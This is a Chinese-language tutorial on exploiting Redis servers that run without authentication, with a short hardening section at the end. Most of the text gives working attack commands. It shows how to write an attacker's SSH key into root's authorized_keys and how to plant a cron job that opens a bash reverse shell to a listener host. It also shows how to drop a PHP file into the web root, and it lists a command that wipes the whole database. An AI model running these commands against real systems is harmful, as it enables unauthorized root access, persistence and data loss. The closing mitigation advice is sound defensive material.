# Redis 未授权访问漏洞利用
---
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。

## 一、漏洞介绍

Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

### 漏洞描述

部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。
利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。

## 二、漏洞利用

首先在本地生产公私钥文件：

`$ ssh-keygen –t rsa`

然后将公钥写入 foo.txt 文件

`$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt`

连接 Redis 写入文件

```
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379> config set dir /root/.ssh/
OK
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/root/.ssh"
$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
OK
$ 192.168.1.11:6379> save
OK
```

这里讲解下，这里设定了crackit的键值为公钥，并通过redis命令变更Redis DB 文件及存放地点为默认root用户SSH key存放文件，并将键值重定向追加到远程文件authorized_keys的末尾，也就上传了公钥。
这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：

`$ ssh –i  id_rsa root@192.168.1.11`

可远程利用自己的私钥登录该服务器。

## 其他攻击方法

### 1.redis基本命令

连接redis

`redis-cli -h 192.168.63.130`

查看redis版本信息、一些具体信息、服务器版本信息等等：

`192.168.63.130:6379>info`

将变量x的值设为test：

`192.168.63.130:6379>set x "test"`

是把整个redis数据库删除，一般情况下不要用！！！

`192.168.63.130:6379>flushall`

查看所有键：

`192.168.63.130:6379>KEYS *`

获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。

`192.168.63.130:6379>CONFIG GET dir`

`192.168.63.130:6379>CONFIG GET dbfilename`

### 2.攻击的几种方法

#### (1).利用计划任务执行命令反弹shell

在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口

`nc -lvnp 55555`

然后执行命令:

```
root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/55555 0>&1\n"
OK
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK
```

nc监听端口已经反弹回来shell

> ps:此处使用bash反弹shell，也可使用其他方法

#### 反弹shell的几种姿势 (2).写ssh-keygen公钥然后使用私钥登陆

在以下条件下，可以利用此方法

1 Redis服务使用ROOT账号启动

2 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

首先在本地生成一对密钥：

`root@kali:~/.ssh# ssh-keygen -t rsa`

然后redis执行命令：

```
192.168.63.130:6379> config set dir /root/.ssh/
OK
192.168.63.130:6379> config set dbfilename authorized_keys
OK
192.168.63.130:6379> set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"
OK
192.168.63.130:6379> save
OK
```

save后可以直接利用公钥登录ssh

#### (3).往web物理路径写webshell

当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell

执行以下命令

```
192.168.63.130:6379> config set dir /var/www/html/
OK
192.168.63.130:6379> config set dbfilename shell.php
OK
192.168.63.130:6379> set x "<?php phpinfo();?>"
OK
192.168.63.130:6379> save
OK

```

即可将shell写入web目录(web目录根据实际情况)

## 修复建议/安全建议

### 1.禁止一些高危命令

修改 redis.conf 文件，添加

```
rename-command FLUSHALL ""
rename-command CONFIG   ""
rename-command EVAL     ""
```

来禁用远程修改 DB 文件地址

### 2.以低权限运行 Redis 服务

为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆

`$ groupadd -r redis && useradd -r -g redis redis`

### 3.为 Redis 添加密码验证

修改 redis.conf 文件，添加

`requirepass mypassword`

### 4.禁止外网访问 Redis

修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用

`bind 127.0.0.1`

### 5.保证 authorized_keys 文件的安全

为了保证安全，您应该阻止其他用户添加新的公钥。
将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：

`$ chmod 400 ~/.ssh/authorized_keys`

为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：

`# chattr +i ~/.ssh/authorized_keys`

然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：

`# chattr +i ~/.ssh`

> 注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。